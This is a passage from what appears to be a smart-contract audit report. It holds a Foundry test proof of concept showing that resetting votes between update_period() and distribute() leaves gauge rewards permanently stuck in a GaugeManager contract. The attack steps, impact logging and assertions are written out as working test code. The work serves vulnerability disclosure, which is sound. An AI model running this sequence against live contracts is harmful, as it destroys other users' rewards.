ization)\n        // WEEK = 1800 seconds (30 min), NO_VOTING_WINDOW = 300 seconds (5 min)\n        // Move to epoch 1 voting window\n        uint256 epoch1Start = 1800;\n        uint256 epoch1VoteWindow = epoch1Start + 300;\n        vm.warp(epoch1VoteWindow + 10);\n        console.log(\"Advanced to Epoch 1 voting window (timestamp:\", block.timestamp, \")\");\n        \n        // Alice votes for the gauge\n        address[] memory pools = new address[](1);\n        pools[0] = pool;\n        uint256[] memory weights = new uint256[](1);\n        weights[0] = 100;\n        \n        vm.prank(alice);\n        voter.vote(aliceTokenId, pools, weights);\n        console.log(\"Alice voted for gauge in Epoch 1\");\n        \n        uint256 totalWeightEpochN = voter.weights(pool);\n        console.log(\"Total voting weight:\", totalWeightEpochN / 1e18);\n        console.log(\"\");\n\n        // ===== ADVANCE TO NEW EPOCH =====\n        console.log(\"--- ADVANCING TO EPOCH N+1 ---\");\n        // WEEK = 1800 seconds in testnet\n        uint256 currentEpochN = (block.timestamp / 1800) * 1800;\n        uint256 nextEpochStart = currentEpochN + 1800;\n        uint256 nextEpochVoteWindow = nextEpochStart + 300; // After NO_VOTING_WINDOW\n        vm.warp(nextEpochVoteWindow + 10); // Move to new epoch's voting window\n        console.log(\"Advanced to Epoch N+1\");\n        console.log(\"Current timestamp:\", block.timestamp);\n        console.log(\"\");\n\n        // ===== ATTACK PHASE =====\n        console.log(\"--- ATTACK PHASE ---\");\n        console.log(\"Step 1: Attacker calls update_period()\");\n        \n        // Record state before update_period\n        uint256 gaugeManagerBalanceBefore = hybr.balanceOf(address(gaugeManager));\n        uint256 claimableBefore = gaugeManager.claimable(gauge);\n        \n        console.log(\"State BEFORE update_period:\");\n        console.log(\"  Gauge claimable:\", claimableBefore / 1e18, \"HYBR\");\n        console.log(\"  GaugeManager HYBR balance:\", gaugeManagerBalanceBefore / 1e18, \"HYBR\");\n        \n        // ATTACK STEP 1: Call update_period (anyone can call this)\n        minter.update_period();\n        \n        uint256 claimableAfterUpdate = gaugeManager.claimable(gauge);\n        \n        console.log(\"\\nState AFTER update_period:\");\n        console.log(\"  Gauge claimable:\", claimableAfterUpdate / 1e18, \"HYBR\");\n        console.log(\"  New emissions distributed to GaugeManager\");\n        \n        // ATTACK STEP 2: Alice resets her votes BEFORE distribute is called\n        console.log(\"\\nStep 2: Alice resets votes (reducing gauge weight to near-zero)\");\n        vm.prank(alice);\n        voter.reset(aliceTokenId);\n        \n        uint256 weightAfterReset = voter.weights(pool);\n        console.log(\"Gauge weight AFTER reset:\", weightAfterReset / 1e18);\n        console.log(\"Weight reduced from\", totalWeightEpochN / 1e18, \"to\", weightAfterReset / 1e18);\n        \n        // ATTACK STEP 3: Now distribute is called\n        console.log(\"\\nStep 3: distribute() is called\");\n        console.log(\"This uses CURRENT weight (\", weightAfterReset / 1e18, \") instead of epoch weight\");\n        \n        address[] memory gaugesToDistribute = new address[](1);\n        gaugesToDistribute[0] = gauge;\n        gaugeManager.distribute(gaugesToDistribute);\n        \n        console.log(\"\");\n        \n        // ===== VERIFY VULNERABILITY =====\n        console.log(\"--- VULNERABILITY VERIFICATION ---\");\n        \n        uint256 actualRewards = gaugeManager.claimable(gauge);\n        uint256 gaugeManagerBalanceAfter = hybr.balanceOf(address(gaugeManager));\n        \n        console.log(\"State AFTER distribute:\");\n        console.log(\"  Claimable rewards for gauge:\", actualRewards / 1e18, \"HYBR\");\n        console.log(\"  GaugeManager HYBR balance:\", gaugeManagerBalanceAfter / 1e18, \"HYBR\");\n        \n        // Calculate lost rewards (rewards that should have been distributed but are stuck)\n        uint256 emissionsReceived = gaugeManagerBalanceAfter - gaugeManagerBalanceBefore;\n        \n        console.log(\"\\n=== IMPACT ANALYSIS ===\");\n        console.log(\"Emissions received by GaugeManager:\", emissionsReceived / 1e18, \"HYBR\");\n        console.log(\"Claimable rewards for gauge:\", actualRewards / 1e18, \"HYBR\");\n        console.log(\"Rewards PERMANENTLY LOST (stuck in GaugeManager):\", emissionsReceived / 1e18, \"HYBR\");\n        console.log(\"\");\n        console.log(\"EXPLANATION:\");\n        console.log(\"  - update_period() increased global index based on totalWeight\");\n        console.log(\"  - Alice reset votes BEFORE distribute(), reducing weight to near-zero\");\n        console.log(\"  - distribute() calculated rewards using CURRENT weight (near-zero)\");\n        console.log(\"  - Line 376 in GaugeManager._updateForAfterDistribution: _supplied = 0\");\n        console.log(\"  - Line 387 SKIPPED: if (_delta > 0) { claimable[_gauge] += _share; }\");\n        console.log(\"  - Line 393 EXECUTED: supplyIndex[_gauge] = index (updated without rewards)\");\n        console.log(\"  - Result: Rewards permanently stuck in GaugeManager contract\");\n        \n        console.log(\"\\n=== VULNERABILITY CONFIRMED ===\");\n        console.log(\"Root Cause: Using IVoter(voter).weights(_pool) instead of epoch snapshots\");\n        console.log(\"Impact: Complete loss of epoch rewards for the gauge\");\n        console.log(\"Funds Status: PERMANENTLY LOCKED in GaugeManager\");\n        console.log(\"\");\n        \n        // Assertions to prove the vulnerability\n        assertTrue(actualRewards == 0 || actualRewards < emissionsReceived / 10, \"Rewards lost/minimal\");\n        assertTrue(emissionsReceived > 0, \"Emissions were sent to GaugeManager\");\n        assertTrue(gaugeManagerBalanceAfter > gaugeManagerBalanceBefore, \"GaugeManager holding stuck funds\");\n        \n        console.log(\"=== TEST PASSED: CRITICAL VULNERABILITY CONFIRMED ===\");\n    }\n}\n\n// Mock ERC20 for testing\ncontract MockERC20 {\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        _mint(msg.sender, 1000000 * 10**_decimals);\n    }\n\n    function _mint(address to, uint256 amount) internal {\n        totalSupply += amount;\n        balanceOf[to] += amount;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        allowance[from][msg.sender] -= amount;\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n}\n```\n\n```\nRun with: `forge test --match-test test_CRITICAL_RewardsCanBePermanentlyDeleted -vv`\n```",
